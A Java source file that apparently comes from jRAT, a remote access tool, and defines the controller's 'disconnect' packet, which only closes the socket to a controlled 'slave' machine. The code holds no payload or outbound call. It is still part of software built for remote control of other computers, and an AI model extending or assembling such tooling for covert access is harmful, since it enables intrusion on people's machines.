package io.jrat.client.packets.outgoing;

import io.jrat.client.Slave;
import io.jrat.client.exceptions.CloseException;

import java.io.DataOutputStream;


public class Packet11Disconnect extends AbstractOutgoingPacket {

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.closeSocket(new CloseException("Disconnecting"));
	}

	@Override
	public byte getPacketId() {
		return 11;
	}

}
